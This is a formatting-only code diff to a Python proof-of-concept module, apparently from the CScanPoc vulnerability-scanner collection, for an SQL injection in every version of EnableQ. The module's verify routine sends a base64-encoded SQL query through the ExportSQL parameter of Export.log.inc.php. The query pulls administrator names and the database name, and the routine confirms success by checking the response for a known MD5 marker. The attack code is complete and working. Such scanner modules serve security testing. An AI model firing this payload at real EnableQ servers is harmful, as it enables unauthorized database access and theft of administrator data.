@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'EnableQ_0001' # 平台漏洞编号，留空
+    vuln_id = 'EnableQ_0001'  # 平台漏洞编号，留空
     name = 'EnableQ全版本 sql注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2014-12-23'  # 漏洞公布时间
     desc = '''
         EnableQ全版本通杀sql注入(越权整个SQL语句注射)：
@@ -23,6 +24,7 @@ class Vuln(ABVuln):
     product = 'EnableQ'  # 漏洞应用名称
     product_version = '*'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = 'd1670d9f-da77-4e01-9af8-51461ae6d852'
     author = '47bwy'  # POC编写者
@@ -35,14 +37,14 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #http://www.wooyun.org/bugs/wooyun-2010-088298
+
+            # http://www.wooyun.org/bugs/wooyun-2010-088298
             payload = '/enableq/enableq91_php52/Export/Export.log.inc.php?ExportSQL=U0VMRUNUIGEuKixjb25jYXQoTUQ1KDEpLCc6JyxkYXRhYmFzZSgpKSBhcyBhZG1pbmlzdHJhdG9yc05hbWUgRlJPTSBlcV9hZG1pbmlzdHJhdG9yc2xvZyBhLCBlcV9hZG1pbmlzdHJhdG9ycyBiIFdIRVJFIGEuYWRtaW5pc3RyYXRvcnNJRD1iLmFkbWluaXN0cmF0b3JzSUQgT1JERVIgQlkgYS5hZG1pbmlzdHJhdG9yc0xvZ0lEIERFU0M='
             verify_url = self.target + payload
             r = requests.get(verify_url)
 
             if r.status_code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in r.content:
-                #security_hole(target)
+                # security_hole(target)
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
@@ -51,6 +53,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
